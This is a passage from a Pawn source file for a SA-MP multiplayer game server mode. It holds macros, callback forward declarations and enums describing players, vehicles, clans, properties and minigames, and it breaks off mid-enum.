#define SetTimerPck(%1,%2) %1 = SetTimerEx(%2), SetProperty_INT(timerprop(%1),1)
#define SetPlayerHealth SetPlayerHealth2
#define SetPlayerArmour SetPlayerArmour2
#define SpawnPlayer SpawnPlayer2
#define LagTest_Start(%1) new tick_ = GetTickCount(); ToRCON(white,%1 " - starting lag test"); Log("LagTest",ConsoleID,%1 " - starting lag test")
#define LagTest_End(%1) do if(GetTickCount()-tick_ > 0) { new lt_[128]; format(lt_,sizeof(lt_),"%s - lag test result: %d%s",%1,GetTickCount()-tick_,GetTickCount()-tick_ >= 900 ? ("WTFACK") : ("")); Log("LagTest",ConsoleID,lt_); ToRCON(white,lt_); } while FALSE
#define LagTest_EndEx(%1,%2) do if(GetTickCount()-tick_ > 0) { new lt_[128]; format(lt_,sizeof(lt_),%1 " - lag test result: %d%s",%2,GetTickCount()-tick_,GetTickCount()-tick_ >= 900 ? ("WTFACK") : ("")); Log("LagTest",ConsoleID,lt_); ToRCON(white,lt_); } while FALSE
#define flinekey(%1) (strmid(_tmpString,%1,0,strfind(%1,"=")), _tmpString)
#define flinevalue(%1) (strmid(_tmpString,%1,strfind(%1,"=")+1,strfind(%1,"\r\n") == -1 ? strlen(%1) : strfind(%1,"\r\n")), _tmpString)
#define equal(%1,%2) (!strcmp(%1,%2,true) && strlen(%1) == strlen(%2))
#pragma dynamic 1000000
//=[Forwards]===================================================================
forward Contents();
forward Contents3();
forward AntiCheat(playerid);
forward AutoMessage();
forward StartWar();
forward StartWar2();
forward CheckWar();
forward StartRace(racetype,raceway);
forward StartRace2();
forward DuringRace();
forward StartWWE();
forward StartWWE2();
forward CheckWWE();
forward UnFreeze(playerid, use);
forward StartActivity();
forward StartActivity2();
forward Lotto();
forward Lotto2();
forward PetAttacking(playerid,id);
forward UnMute(playerid);
forward UnJail(playerid);
forward AirStrike(playerid);
forward CountDown();
forward StartKart();
forward StartKart2();
forward CheckKart();
forward StartMonster();
forward StartMonster2();
forward CheckMonster();
forward PropertiesPay();
forward OnPlayerTeamPrivmsg(playerid,msg[]);
forward Contents2();
forward CanA(playerid,id);
forward CanS(playerid);
forward CanAFK(playerid);
forward CanTeleP(playerid);
forward CanHitman(playerid);
forward CanRob(playerid);
forward ResetWarned(playerid);
forward ResetOption2();
forward StartSRace(srid);
forward StartSRace2();
forward DestroyPickup2(pid);
forward Explosion(playerid,bombid,bp1,bp2,bp3);
forward playerCanUseAnim(playerid);
forward BattleCD(playerid,playerid2);
forward DriftCD(playerid,playerid2);
forward RaceCD(playerid,playerid2);
forward PutInVehicle(playerid,vehicleid,seat);
forward PutInVehicle3(playerid,vehicleid,seat);
forward Boomcar(playerid,vehicleid,seat);
forward Math();
forward Math2();
forward Trivia();
forward Trivia2();
forward CanP(playerid);
forward PayTimer(playerid,id,amount,type);
forward FireworksLine(Float:x,Float:y,Float:z,count);
forward FireworksMatar(Float:x,Float:y,Float:z,count);
forward allowSICommand();
forward allowCCCommand();
forward allowauctionCommand();
forward VIPSuicide(playerid);
forward Reporting(id);
forward WeHateYou(playerid);
forward SiteUpdate();
forward OnPlayerPrivmsg(playerid,recieverid,text[]);
forward StartKickstar();
forward StartKickstar2();
forward WinKickstar();
forward PropertyDeleting(propname[]);
forward Replytest();
forward Replytest2();
forward ReplytestTimeCount();
forward StartNPCRace(playerid,blevel);
forward EndNPCRace(playerid,bot);
forward HideMarkers(playerid,id);
forward ObjectTimerAct(objectid,exp,eq,des,vw);
forward SR_MoveObjectByTimer(objectid,Float:x,Float:y,Float:z,Float:s,des);
forward OnPlayerAttack(playerid, weaponid);
forward OnPlayerWeaponSwitch(playerid, oldweapon, newweapon, spentammo);
forward OnPlayerTargetPlayer(playerid, newtarget, oldtarget);
forward OnPlayerHealthChange(playerid, Float:oldhealth, Float:newhealth);
forward OnPlayerDoneCameraPath(playerid, path);
forward RemoteCreateSObject(modelid,Float:xpos,Float:ypos,Float:zpos,Float:xrot,Float:yrot,Float:zrot,Float:showdis,interior,world);
forward HydrogenBoom(Float:x,Float:y,Float:z,pos,vw);
forward DiehardPublic(playerid);
forward LifeGoodPublic(playerid);
forward Slap(playerid);
forward StopVAdv();
forward StopAuction();
forward StartEWar();
forward StartEWar2();
forward WoL();
forward WoL2();
forward Reset();
forward ResetAmmu(playerid);
forward UseClanUltimatePower(playerid,id,ps);
forward StopEarthEnergy(userclan,o1,o2,o3,o4,o5);
forward ClanGodAttack(userclan);
forward ClanGodAttack2(attacked,attack,userclan);
forward StartClanWar(clanid);
forward SetPlayerWeatherTo(playerid,weatherid);
forward AbleToUseTorpedo(vid);
forward OnPlayerChatCommand(playerid,cmdtext[]);
forward Retreat(c,reason[]);
forward CheckHQAttack(playerid,type);
forward HeadquarterRuling(c);
forward UpdatePlayerWeapons(playerid);
forward StartFTT();
forward EndFTT(win);
forward StartParty();
forward EndParty();
forward StartWarGame(wgid);
forward StartWarGame2();
forward StartManhunt(mtype);
forward StartManhunt2();
forward RaceTextDraw(playerid,act[]);
forward EndAchievement(playerid,notime);
forward ExplodeByTimer(Float:x,Float:y,Float:z,expid,shake,vw);
forward DestroyObjectByTimer(objectid);
forward GoTutorial(playerid);
forward StartSport(sporttype);
forward StartSport2();
forward WinSport();
forward TakeEnergyByTimer(playerid,take);
forward SportShoot(playerid,final);
forward ShootingRangeTimer(playerid,status);
forward ShowSGarageMenu(playerid);
forward LaserEye(playerid,num);
forward TempTextDraw(playerid,txtnum,des);
forward GoingDown(playerid,Float:h,Float:a,num);
forward TempWeather(playerid);
forward HealingTree(playerid,num);
forward WoodClone(num,playerid);
forward EraseCircleEffect(playerid,erased,t);
forward MoonAttack(playerid,todmg);
forward StartAmmunationSale();
forward EndAmmunationSale();
forward PutInUnderground(playerid);
forward TDAMDisappear();
forward DoubleLotto();
forward DoubleLotto2();
forward HeadquarterElevator(playerid,clanid);
forward HQElevatorEvent(num,playerid);
forward LoadClanHeadquarter(clanid, fileid);
forward UnloadClanHeadquarter(clanid);
forward LoadOrgHeadquarter(orgid);
forward UnloadOrgHeadquarter(orgid);
forward StartArmy(ty);
forward StartArmy2();
forward Crash(playerid);
forward FileSetString(fname[],key[],val[]);
forward OpenLunaPark();
forward CloseLunaPark();
forward StartSailingShip();
forward Sailing();
forward EndSailingShip();
forward OnPlayerUsing22(playerid);
forward RemovePlayerTempPickup(playerid,vid,Float:vh,param);
forward RemovePlayerTDMPickup(playerid,typ,Float:h);
forward StartActivitySequence();
forward ActivitySequence(numact);
forward EndActivitySequence();
forward FacePunch(playerid,Text:tdraw,animframe);
forward OnPlayerEnterPickup(playerid,pickupid);
forward OnPlayerLeavePickup(playerid,pickupid);
forward StartTeamActivity(atype);
forward StartTeamActivity2();
forward ConnectNPCs();
forward EndPickupsActivity();
forward StartZombies();
forward StartZombies2();
forward StartGlass();
forward StartGlass2();
forward CheckGlass();
forward WinGlass();
forward BackgroundWorker();
forward FullGamemodeLoading();
forward OnPlayerCommand(playerid,cmdtext[]);
forward ScreenFadeComplete(playerid,afterhold);
forward ShavuotSkin(playerid);
forward LocalKick(playerid,adminid,reason[],inchat_);
forward OnNPCCommand(playerid,cmdtext[]);
forward StartShow(showid);
forward StartShow2();
forward DuringShow();
forward EndShow();
forward StartBriefcase();
forward StartBriefcase2();
forward CheckBriefcase();
//=[Natives]====================================================================
native gpci(playerid, buffer[], buffer_length = 32);
//=[Enums]======================================================================
enum PlayerInfoData
{
	playername[MAX_PLAYER_NAME],
	playerip[16],
	#if aimbotcheck
	awarns,
	#endif
	afk,
	Float:startpos[3],
	spawned,
	alive,
	logged,
	admin,
	admlog,
	adminone,
	superlog,
	faileds[2],
	logindia,
	intime[2],
	color[3],
	kills,
	killsforid[MAX_PLAYERS],
	bool:damageforid[MAX_PLAYERS],
	updatewkills,
	savingmoney[2],
	wkills[40],
	bool:wkillschange[40],
	deaths,
	level,
	slevelname[64],
	copypower[3],
	vtele3,
	upower,
	charge,
	upower2,
	charge2,
	upower3[2],
	bank,
	ccard,
	bankshare,
	skin,
	weapons[10],
	ammo[8],
	vehicle[8],
	pvcol[2],
	fuel,
	pvpj,
	pvmod[20],
	pvcol2[2],
	fuelr,
	fuelmax,
	vlistdia[2],
	viewingvehicle,
	icq,
	messenger[50],
	skype[50],
	facebook[50],
	email[50],
	country[50],
	birthdate[3],
	rname[16],
	pic,
	lastmetext[M_S],
	lasttext[M_S],
	lastpmtext[M_S],
	death[11],
	invisible,
	cp,
	incp,
	specp,
	#if acmoney == 2
	money[3],
	moneywarns,
	#elseif acmoney == 1
	money[2],
	#endif
	propertyid,
	showprop,
	showhouse,
	waitwar,
	inwar,
	warid,
	waitrace,
	inrace,
	racecp,
	raceid,
	racerecord[3],
	Text:racetd,
	racemaxcp,
	waitwwe,
	inwwe,
	wweid,
	viewerwwe,
	work,
	coplevel,
	doctorlevel,
	drivecost,
	killerlevel,
	icecreamcost,
	drugs,
	drugsp,
	drugscost,
	plotto,
	bool:actbonus,
	lottoquestion,
	wolmul,
	dmzone,
	tdmzone,
	tdmclick[3],
	returntodm,
	dmzlevel,
	dmworld,
	pet[5],
	dinvited,
	dinviter,
	bet,
	indrift,
	driftcp,
	dcd[2],
	prinvited,
	prinviter,
	inprace,
	pracecp,
	prcd[2],
	binvited,
	binviter,
	dplace,
	prplace,
	noend,
    inbattle,
	Float:battlex,
	Float:battley,
	Float:battlez,
	battletimer,
	bstyle[2],
	btime,
	bplace,
	bcd[2],
	Float:aapos[3],
	aaveh[5],
	aaobj[5],
	aaparam,
	aasetp,
	aatimer,
	aause,
	bonus[4],
	bonus_si,
	mute[2],
	jail[2],
	bool:atoggle[max_atoggles],
	togsay,
	showme,
	spectate,
	bool:specbuttons,
	PlayerText:specutext,
	gang,
	igang,
	gm,
	clan,
	iclan,
	lclan,
	clantag[16],
	org,
	iorg,
	lorg,
	orgtag[16],
	phone,
	phonemodel,
	phonedesign,
	phoneoption,
	calling,
	callid,
	caller,
	callcash,
	publicphone,
	canswer,
	class,
	waitkart,
	inkart,
	kartv,
	waitmonster,
	inmonster,
	monsterv,
	vip,
	gw,
	reqclass,
	setting[max_settings],
	inact,
	Float:lastcoords[3],
	Float:lasth[3],
	nocmd,
	nopm,
	noname,
	nomsg,
	mtime,
	slow,
	gmtimer,
	unftimer,
	recptimer,
	Float:gmlasthp,
	bool:ammuitems[max_ammunation_items],
	ammuitemammo[max_ammunation_items],
	bugarmour,
	Float:mark[3],
	mark2[3],
	flood[4],
	fwarns[3],
	floodsecs,
	tag[64],
	tagbefore[M_S],
	tagcbefore,
	tagcol,
	Float:slastpos[4],
	slastdata[4],
	loadpos,
	incam,
	lastskin,
	ignore[MAX_PLAYERS],
	disconnect,
	dmzkills,
	frozen[2],
	Float:freezepos[3],
	blockpms,
	blockgoto,
	lastmoney,
	cana[2],
	cans,
	canafk,
	cantelep,
	canhitman,
	canrob,
	xjail,
	seth,
	seta,
	die,
	fkwarns,
	Float:speedpos[3],
	modeafk,
	usedafk,
	waitsrace,
	insrace,
	sracecp,
	sraceid,
	hitman,
	sadmin,
	wlevel,
	wantedlevel,
	bomb,
	bombkills,
	bombdmg,
	Float:bombpos[3],
	bombpickup,
	bombtime,
	banned,
	house,
	houseid,
	acctested[max_houses],
	houseacc[max_houses],
	inhouse,
	takekey,
	pp,
	jetpack,
	pleasemoney,
	pmath,
	angry[2],
	pinv,
	ptrivia,
	carjack[MAX_PLAYERS],
	canp,
	paytimer[3],
	hidem,
	lastvmessage[M_S],
	vheal,
	vrocket,
	vsuicide[2],
	nr,
	boomcar,
	wehateyou,
	abf[2],
	nswarns,
	noobwarns,
	lastpm,
	lucifer,
	waitkickstar,
	inkickstar,
	kickstarscore,
	kickstarid,
	kickstarbonus,
	kickstarprize,
	incrane,
	cranetime,
	lastammo,
	lastweapon,
	dscmd,
	indialog,
	lastdialog,
	tinfo,
	inplane,
	inarea51,
	inshooting,
	doneshooting[7],
	instunting,
	donestunting[12],
	savedweapons[13],
	savedammo[13],
	#if hanukkah_now
	donut,
	donuttime,
	#endif
	clickon,
	cclick[3],
	cclickparamint,
	cclickparam[32],
	clickplayer,
	duelclick,
	upgradecmd[50],
	raise,
	raisef,
	raiseby,
	pump,
	underearth,
	mapolet[7],
	mapolets,
	quicklydefence,
	Float:phealth,
	Float:parmour,
	gmwarns,
	getweapon,
	pweapon,
	pspentammo,
	shootbugwarns[2],
	pammo,
	tornado,
	Float:torpos[3],
	storm,
	Float:storpos[3],
	erase,
	Float:erapos[3],
	erasehurt,
	wskill[11],
	ostate,
	nstate,
	lastv,
	rank[MAX_RANKS],
	earns[max_properties],
	propcost[max_properties],
	propscount,
	proptime,
	diehard[2],
	lifegood[2],
	afkreason[64],
	rcontrys,
	cvcolor,
	apslap[2],
	inmarea,
	hshots,
	lcallow,
	voted,
	waitewar,
	inewar,
	pwol,
	godpower,
	poption,
	incwar,
	cancarjump,
	hell,
	helmet,
	fastkilling[2],
	copytext[200],
	rdate[32],
	acweapon[47],
	acammo[47],
	Text3D:p3dtext,
	cdfrozen,
	pingtest[3],
	apingtest[2],
	ppings[MAX_PINGTEST],
	inhq,
	invhq,
	teleportedhq,
	parea,
	tparea,
	energy,
	lasteupdate[2],
	energyrate[2],
	fttused,
	waitmanhunt,
	inmanhunt,
	manhuntid,
	spweapon,
	spwammo,
	ach[3],
	choosenach,
	poisoned,
	Float:poisonhp,
	psniperbullets,
	waitwargame,
	inwargame,
	pkeys[2],
	opatest,
	Float:speedtest[3],
	dontac,
	specallowed,
	usetele,
	using22,
	curfight,
	tut[3],
	PlayerText:speedo,
	Float:pspeed,
	Float:speedup[3],
	pkmh,
	team,
	iteam,
	lteam,
	hearinggate,
	waitsport,
	insport,
	sportscore,
	sportparam,
	sportid,
	noupdate,
	usepower,
	powerparam,
	upowerkeys,
	upowerkeys2,
	upkeyschanging,
	mngpower[64],
	acwarns,
	speedwarns,
	usedcmd,
	mapt,
	srstarted,
	srtimer,
	srseconds,
	srtotal,
	srscore,
	srlevel,
	srweapon,
	srin,
	srobjs,
	srobj[15],
	idletime,
	sgcomp,
	Float:waterpos[3],
	waterobj,
	PlayerText:temptext[max_temptexts],
	temptextid[max_temptexts],
	temptexttimer[max_temptexts],
	temptextdes[max_temptexts],
	lredirection,
	dontwac,
	headshooter,
	lasths,
	energyrelease,
	energypump,
	energystraw,
	cursed,
	useddevilcurse,
	Float:deathpos[3],
	deathdelay,
	createdv[MAX_ADMIN_VEHICLES],
	createdvs,
	report[64],
	reportid,
	reports,
	//spawnmoneydelay,
	lhopt,
	lhiconshowing,
	waitarmy,
	inarmy,
	armyv,
	changedinterior,
	ball,
	ballv,
	hqcheck,
	test,
	incbug[4],
	Float:bestcbug,
	rocketsent,
	pmlist,
	tables,
	securitydelay,
	wtype[max_wtypes],
	showingtxd[max_txd],
	tooktempickup,
	waterwalk[2],
	Text:boomtd[2],
	boomtimer,
	music,
	youtube[M_S],
	noticedmsg[22],
	lastrec,
	lastaga,
	PlayerText3D:ppts[MAX_PPT],
	lastinputtext[32],
	friendask,
	friends,
	invehicle,
	watchingwindow,
	pcode[4],
	usedfind,
	punch,
	access[2],
	question[128],
	answeredby,
	pickup,
	Float:range,
	attype,
	waitteamact,
	inteamact,
	teamactteam,
	teamactid,
	supporting,
	supportask,
	gamesclick[2],
	scroll,
	scrollusing,
	scrolltime,
	waitzombies,
	inzombies,
	zombiesid,
	zombiesweapon,
	lasttele,
	weaponstaken,
	bool:rated[60],
	jumpower,
	waitglass,
	inglass,
	clearanims,
	stoprob,
	robbed,
	target,
	tfostatus,
	vtemp,
	entertime,
	reconnecting[16],
	purim,
	playingmusic,
	botwarns,
	dialogresp,
	sfsteps,
	sfhold,
	sfcur[4],
	sfend[4],
	sfrate[4],
	sfparam,
	lastkills[KILL_TESTS],
	tricking[2],
	lasthptext[2],
	kicking,
	kicktime,
	playerprize,
	shavuot,
	editing,
	clothes,
	Float:clothesp[6],
	clothes2,
	Float:clothes2p[6],
	clothesclick[3],
	clothescost[2],
	fmsg[2],
	fmsggo[2],
	fmsgparam,
	removespac,
	getsetting[5],
	punishdia,
	sniping,
	PlayerText:border[24],
	borderrgb[3],
	borderalpha,
	bordershow,
	bordervis,
	editingborder,
	reloadingt,
	afkcmd,
	setspawn[3],
	Float:setspawnp[4],
	sharkattack,
	bool:isbanned,
	interpolating[2],
	streamedvehicles[MAX_STREAMED_VEHICLES],
	streamedvehiclesmax,
	Float:teleportingp[3],
	kickgun,
	bangun,
	Text3D:guntext,
	guntime,
	invitetime[2],
	showstats,
	security,
	secretword[MAX_SECURITY_WORD_LENGTH],
	selectingpos[3],
	iadminot[3],
	entermessage[6],
	hitfuel,
	bool:objective[MAX_OBJECTIVES],
	friendclick,
	chatinvite,
	inchat,
	chatjointime[16],
	bool:minchat,
	fight[2],
	infountain,
	selfnpc,
	waitbriefcase,
	inbriefcase,
	PlayerText:gambleimg[4],
	PlayerText:mtexts[3],
	gambleinfo[6],
	silence[max_silence_types],
	iplogin,
	usedkill,
	fknewac,
	pickupteleporting,
	failedword,
	bool:usedammu,
	sguard[2], // guard_shit
	bool:acweapons[13],
	acammon[13],
	bool:warned,
	warnings,
	pwarnings,
	pModelPage,
	pModelID,
    bool:pModelActive,
    bool:firstspawn,
    bool:hacker,
    bool:finalwarning,
    s0beitbantimer,
    s0beitdate1[11],
    s0beitdate2[11],
    s0beitdate3[11],
	clancam,
	flymode[5],
	flyobject,
	Float:flyspeed,
	flytype,
	admingangzone,
	castle,
	mission,
	mvehicle,
	mstime,
	mpickup,
	mlpickup[MAX_MISSION_TARGETS],
	mcheckpoint,
	mstatus,
	mstimenew,
	bvehicle,
	fpage,
	pShootTC[47],
	bool:usedcode[20],
	bool:blockplayers,
	bool:naorslap
};
enum ModelInfoData
{
	mPreview,
	mBackground,
	mSelect,
	mHeader[64],
	mModels[MAX_MODEL_ITEMS],
	Float:mZoom[MAX_MODEL_ITEMS],
	Float:mRotX[MAX_MODEL_ITEMS],
	Float:mRotY[MAX_MODEL_ITEMS],
	Float:mRotZ[MAX_MODEL_ITEMS],
	mAmount
}
enum ModelTypes
{
	mLast,
	mVehicles
}
enum VehicleInfoData
{
	lastdriver,
	locked,
	Float:vhealth,
	store,
	racedriver,
	kartdriver,
	monsterdriver,
	armydriver,
	vvalid,
	vemodel,
	Float:vspawnpos[4],
	Float:vpos[4],
	vcol[2],
	newvcol[2],
	vpj,
	veint,
	veworld,
	sveint,
	vevip,
	vmods[14],
	vclan,
	vorg,
	vspecial,
	spobjects,
	spobject[5],
	vspecialid,
	vspecialname[32],
	sv_ability,
	onlyview,
	vowner,
	vrockets[2],
	vgm,
	vcantenter,
	tobein,
	vnpcs,
	vfuel,
	Text3D:vtext[3],
	vatt,
	vbomb,
	streamidx[MAX_PLAYERS],
	playersin
};
enum RandomSpawnsEnum
{
	Float:rsX,
	Float:rsY,
	Float:rsZ,
	Float:rsA,
	rsI
};
enum PicturesEnum
{
	Float:PCx,
	Float:PCy,
	Float:PCz,
	Float:PPx,
	Float:PPy,
	Float:PPz,
	Float:PPa,
	PInterior,
	PTime
};
enum TeleportsEnum
{
	Tcmd[M_S],
	Float:Tx,
	Float:Ty,
	Float:Tz,
	Float:Ta,
	Ti,
	Tw,
	Tl,
	Tauthor[32],
	bool:Twithv,
	bool:Tfreeze,
	bool:Tnoshooting,
	TAC,
	Ttype,
	Tcategory,
	Ttext[64],
	Trate,
	Trates
};
enum TeleportRatingEnum
{
	Tratescore,
	Tratename[32]
};
enum AmmunationEnum
{
	aName[M_S],
	aID,
	aCost,
	aAmmo,
	aLevel,
	aSlot,
	aAddTab
};
enum AmmunationItemsEnum
{
	aiName[32],
	aiID,
	aiCost,
	aiAmmo,
	aiLevel
};
enum AmmunationSalesEnum
{
	asName[64],
	asCost,
	asWeapons[3],
	asLevel
};
enum LevelsEnum
{
	NeedKills,
	LevelName[M_S],
	BankLimit,
	AmmoLimit,
	Float:DeathHealth,
	Float:DeathArmour,
	RobSuccess,
	EnergyLimit
};
enum GangInfoData
{
	gplayers[100],
	gname[M_S],
	gexist,
	gmembers,
	gcolor[3],
	gbank,
	gleader
};
enum ClanInfoData
{
	cplayers[max_clan_members],
	cname[M_S],
	cmembers,
	ccolor[3],
	cbank,
	cbankcp,
	ccmd[M_S],
	Float:chq[4],
	Float:chqv[4],
	ctest,
	cvalid,
	hashq,
	chqid,
	cobject[50],
	cobjects,
	cvehicle[50],
	cvehicles,
	cpickup[50],
	cpickups,
	clbank,
	cmaxbank,
	ccp,
	bool:cpeace[MAX_CLANS],
	bool:cask[MAX_CLANS],
	cwarasked[2],
	cwarplayer[max_clan_members],
	cwarplayers,
	cinwar,
	cwarcd,
	cwintimes,
	cmessage[128],
	cchatlock,
	cchatcolor[2],
	cchatpeace,
	cusingpower,
	cendpower[2],
	cgodobject[17],
	cgodobjects,
	cgzone,
	cgzonesize,
	cgzoneshow,
	carea,
	cruler,
	cruling[3],
	Text:crulingtext,
	cclosetele,
	cperms[max_clanperms],
	bool:csystems[max_clansystems],
	csystemparam[max_clansystems],
	cruletimes,
	cprotected,
	bool:cpowers[15],
	calert[2],
	csecurity
};
enum ObjectInfoData
{
	omodel,
	ovalid,
	Float:opos[3],
	Float:orot[3],
	Float:sopos[3],
	Float:sorot[3],
	omoving[3], // 0=can move 1=clan 2=moving
	oorg,
	ointerior,
	oworld,
	Float:omoveto[4],
	Float:oautomove[13],
	odam,
	Float:odmg,
	oeam,
	ocgod,
	opaths,
	odonepaths,
	pathevent[32],
	patheventparam,
	Float:opath[80],
	materialmodel,
	materialtxd[32],
	materialtexture[32],
	materialcolor,
	oarea
};
enum CPs
{
	cpactive,
	Float:cpx,
	Float:cpy,
	Float:cpz,
	cpint,
	cpworld,
	Float:cpsize,
	Float:cpdis,
	cptype,
	cppar,
	cpname[64],
	cpstoreid,
	cpused,
	cparea
};
enum PropertiesEnum
{
	pname[M_S],
	Float:px,
	Float:py,
	Float:pz,
	pcost,
	pearning,
	spid,
	sptext[M_S],
	owner,
	ppickup
};
enum SRaceEnum
{
	srType,
	Float:srX,
	Float:srY,
	Float:srZ,
	Float:srA
};
enum SRaceType
{
	srCommand[16],
	srName[32],
	srPlace,
	srWin[3],
	Float:srCPSize,
	srID2
};
enum BombsEnum
{
	bCost,
	bLevel,
	bValid,
	bName[64]
};
enum actInfoEnum
{
	actExist,
	actPlayers,
	actMax,
	actName[M_S],
	actEndJoin,
	actAdmin,
	actNeedVehicle,
	bool:actTK
};
enum PickupInfoEnum
{
	pvalid,
	pmodel,
	Float:ppos[3],
	ptype,
	pfunc,
	pspecialid,
	Text3D:ptext,
	pworld,
	Float:pdis,
	moneypickup
};
enum TriviaEnum
{
	tQuestion[128],
	tAnswer1[64],
	tAnswer2[64],
	tAnswer3[64]
};
enum ScrollsEnum
{
	scShort[64],
	scName[M_S],
	scTime
};
enum ColorEnum
{
	colName[32],
	colHebName[32],
	colHex,
	colHexStr[32]
};
enum ColorListsEnum
{
	ColorListName[32],
	colorsHex[9]
};
enum FirePlaceData
{
	fpStart,
	fpEnd,
	fpUpdate
};
enum MovingTextData
{
	Float:mtX,
	Float:mtY,
	mtText[MAX_MOVINGTEXT_LENGTH],
	mtUsing,
	mtPlayerid
};
enum NPCsData
{
	npcFile[16],
	npcName[MAX_PLAYER_NAME],
	npcVehicle,
	npcVehicleSeat,
	Text3D:npcText,
	npcSkin,
	npcVehicleModel,
	Float:npcPos[4],
	npcVehicleColor[2],
	npcInterior,
	npcWorld,
	npcParam
};
enum BarData
{
	barSA,
	barName[16],
	barCash
};
enum lcmdsEnum
{
	lcCommand[16],
	lcShort[16],
	lcShort2[16],
	lcLevel,
	lcCL,
	lcMaxCL,
	lcUpgradeCost,
	lcCost,
	lcCMDID,
	bool:lcComp,
	lcExplain[256]
};
enum UPLEnum
{
	uplLevel,
	uplEnergy,
	bool:uplPerSecond,
	uplTitle[64]
};
enum UPEnum
{
	upTitle[20],
	upText[200],
	upElement[32],
	upCost,
	upBuyLevel,
	upColor[16],
	upHex,
	upPower1[UPLEnum],
	upPower2[UPLEnum],
	upPower3[UPLEnum],
	upPower4[UPLEnum],
	upPower5[UPLEnum],
	upPower6[UPLEnum],
	upPower7[UPLEnum],
	upPower8[UPLEnum],
	upPower9[UPLEnum]
};
enum DMZE
{
	dmzCmd[16],
	dmzName[32],
	Float:dmzGravity,
	Float:dmzHStatus[2],
	dmzInterior,
	dmzLevel,
	bool:dmzUsingLevels,
	dmzMaxLevel,
	dmzWorlds
};
enum TDMZE
{
	tdmzCmd[16],
	tdmzCmdS[16],
	tdmzName[32],
	tdmzInterior,
	tdmzLevel,
	Float:tdmzHStatus[2],
	tdmzTeams,
	tdmzColors[4],
	tdmzPositions[4],
	tdmzWeapons_1[5],
	tdmzAmmo_1[5],
	tdmzWeapons_2[5],
	tdmzAmmo_2[5],
	tdmzWeapons_3[5],
	tdmzAmmo_3[5],
	tdmzWeapons_4[5],
	tdmzAmmo_4[5]
};
enum serverDetailsEnum
{
	sdGPlayers,
	sdGAdmins,
	sdWeaponKills[40],
	sdDeaths[5]
};
enum InfoPointEnum
{
	ipvalid,
	ippickup,
	Text3D:iptext,
	Float:ippos[3],
	ipheader[32],
	iptype
};
enum OptionsEnum
{
	optName[64],
	bool:optActive,
	optAdmin,
	bool:optAutoDisable,
	optNewHostname[M_S]
};
enum VoteEnum
{
	vStatus,
	vTotal[2],
	vText[128]
};
enum ClanUPEnum
{
	CUPName[M_S],
	CUPEnergy,
	CUPCD,
	CUPCost,
	CUPID
};
enum ewarenum
{
	ewName[32],
	ewText[M_S]
};
enum VStoreEnum
{
	vstore_vehicles[212],
	vstore_costs[212],
	vstore_active,
	vstore_count,
	Float:vstore_center[4],
	vstore_type
};
enum StuntingEnum
{
	Float:stSpawn[4],
	Float:stJumpFrom[3],
	Float:stEnd[3]
};
enum chatKeywordsEnum
{
	ckWord[8],
	ckReplaceTo[32]
};
enum AreaInfoEnum
{
	areavalid,
	Float:areacoords[4],
	Float:areaheight[2],
	areaworld,
	areainterior,
	areagangzone,
	areatype,
	areaparam
};
enum PhoneEnum
{
	phType[32],
	phText[64],
	phCost
};
enum WarGamesEnum
{
	wgCommand[16],
	wgName[32],
	wgWeapons[10],
	wgAmmo[10],
	wgPositions,
	wgSkin,
	wgText[128],
	wgID
};
enum ManhuntEnum
{
	mhCommand[16],
	mhName[32],
	mhAntiTK,
	mhMColor,
	mhMWeapons[5],
	mhMAmmo[5],
	Float:mhMHealth,
	Float:mhMArmour,
	mhMSkin,
	mhHColor,
	mhHWeapons[5],
	mhHAmmo[5],
	Float:mhHHealth,
	Float:mhHArmour,
	mhHSkin,
	mhText[M_S],
	mhID
};
enum SpAmmunationEnum
{
	spaName[32],
	spaID,
	spaCost,
	spaWeapon,
	spaAmmo,
	bool:spaObject,
	spaLevel,
	bool:spaSaved,
	spaText[128]
};
enum AchievementsEnum
{
	achName[64],
	achText[M_S],
	achTime,
	achPrize,
	achKills,
	achWeapon[3],
	achState[3]
};
enum TeamInfoData
{
	teamname[M_S],
	teamexist,
	teamchat,
	teamchar
};
enum SGarageEnum
{
	gcValid,
	gcName[64],
	gcCost,
	gcText[128]
};
enum ArmyEnum
{
	arName[32],
	arVID
};
enum BattleStyleEnum
{
	bsName[40],
	bsWeapons[5]
};
enum VBattleStyleEnum
{
	vbsName[40],
	vbsModel,
	Float:vbsHealth,
	Float:vbsPos1[4],
	Float:vbsPos2[4]
};
enum SettingsEnum
{
	stName[32],
	stType,
	stDefault,
	stText[128]
};
enum ObjectedVehicleData
{
	ovValid,
	ovObjectID,
	ovAttached[MAX_ATTACHED_OBJECTED],
	ovAttacheds
};
enum OrgInfoData
{
	oname[M_S],
	ocmd[M_S],
	Float:ohq[4],
	Float:ohqv[4],
	orgvalid,
	ohashq,
	oobject[50],
	oobjects,
	ovehicle[50],
	ovehicles,
	opickup[50],
	opickups
};
enum ClanPermsEnum
{
	clpName[128],
	clpDefault,
	clpUniqueID
};
enum ClanSystemsEnum
{
	clsName[32],
	clsCost,
	clsParam,
	clsUniqueID
};
enum PetsEnum
{
	petName[32],
	petHebName[32],
	petCost,
	petLevel,
	petModel,
	Float:petRadius,
	Float:petSize,
	Float:petDamage,
	Float:petSpeed,
	Float:petOffset[6]
};
enum WeaponTypesEnum
{
	wtName[32],
	wtWeapons[2]
};
enum PlayerStatusEnum
{
	statusName[32],
	bool:statusBusy
};
enum PerPlayer3DText
{
	pptValid,
	pptType,
	Float:pptPos[3],
	Float:pptDrawDistance,
	pptVirtualWorld,
	pptText[100]
};
enum PlacesEnum
{
	plValid,
	plName[32],
	plText[128],
	plCMD[32],
	Float:plPos[3]
};
enum CodesEnum
{
	cdName[32],
	cdSID,
	cdMinVal,
	cdMaxVal,
	bool:cdGuard // guard_shit
};
enum TeamActEnum
{
	taCommand[16],
	taName[32],
	taType,
	taMinPlayers,
	taMaxPlayers,
	taAntiTK,
	taTime,
	taWeather,
	taT1Name[32],
	taT1Color,
	Float:taT1Health[2],
	taT1Weapons[5],
	taT1Ammo[5],
	taT1Skin[3],
	taT1Positions,
	taT2Name[32],
	taT2Color,
	Float:taT2Health[2],
	taT2Weapons[5],
	taT2Ammo[5],
	taT2Skin[3],
	taT2Positions,
	taText[M_S]
};
enum AdminAbilitiesEnum
{
	aaName[32],
	aaDone[32],
	aaLevel,
	aaParam[32]
};
enum MusicData
{
	mValid,
	mFile[MAX_MUSIC_NAME],
	mName[MAX_MUSIC_NAME],
	mType
};
enum GPropertyType
{
	gptype_null,
	gptype_int,
	gptype_str
};
enum GPropertiesEnum
{
	gpValid,
	gpName[64],
	GPropertyType:gpType,
	gpValue[64],
	gpDuration
};
enum ClothesEnum
{
	cltModel,
	cltCategory,
	cltBone,
	cltName[32],
